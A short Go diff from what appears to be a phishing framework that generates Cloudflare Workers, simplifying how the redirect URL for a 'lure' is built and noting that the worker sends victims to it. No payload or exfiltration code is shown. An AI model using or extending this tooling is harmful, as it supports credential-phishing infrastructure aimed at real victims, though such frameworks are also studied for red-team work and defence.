@@ -365,16 +365,8 @@ func (g *CloudflareWorkerGenerator) GenerateWorkerFromLure(lure *Lure, workerTyp
 		return "", fmt.Errorf("lure cannot be nil")
 	}
 	
-	// Build the phishing URL
-	phishletConfig := g.cfg.PhishletConfig(lure.Phishlet)
-	if phishletConfig.Hostname == "" {
-		return "", fmt.Errorf("phishlet '%s' has no hostname configured", lure.Phishlet)
-	}
-	
+	// Build the phishing URL — the worker redirects victims TO this URL
 	redirectUrl := fmt.Sprintf("https://%s%s", lure.Hostname, lure.Path)
-	if lure.RedirectUrl != "" {
-		redirectUrl = lure.RedirectUrl
-	}
 	
 	config := CloudflareWorkerConfig{
 		Type:            workerType,
